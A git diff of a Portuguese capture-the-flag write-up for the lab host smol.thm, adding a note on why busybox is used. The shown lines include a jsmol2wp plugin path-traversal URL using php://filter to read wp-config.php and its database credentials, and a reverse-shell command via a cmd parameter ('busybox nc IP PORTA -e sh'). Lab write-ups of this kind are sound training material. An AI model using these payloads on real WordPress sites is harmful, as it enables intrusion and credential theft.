@@ -51,7 +51,7 @@
     - http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
       |_> Essa poc já revela as credênciais no arquivo de configurações do banco de dados!
       |_> Com elas também é possível logar na aplicação!
-      |_> O uso do wrapper `php://filter` permite ler arquivos PHP sem executá-los,
+      |_> O uso do wrapper `php://filter` permite ler arquivos PHP sem executá-los
 
 isso permite acesso total ao banco de dados, podendo levar a dump de usuários, hashes e potencial comprometimento completo da aplicação
 
@@ -106,6 +106,8 @@ retornando seu conteúdo em texto puro.
 ### Ganhando uma shell no servidor:
 
 --> http://www.smol.thm/wp-admin/index.php?cmd=busybox nc IP PORTA -e sh
+
+Busybox foi usado porque o netcat padrão do sistema não suporta a opção -e. O busybox é como se fosse um canivete suíço com vários binários em um só.
 
 <img width="833" height="338" alt="imagem" src="https://github.com/user-attachments/assets/124a4057-5c0a-4cc2-8c99-f4c55db4f777" />
 
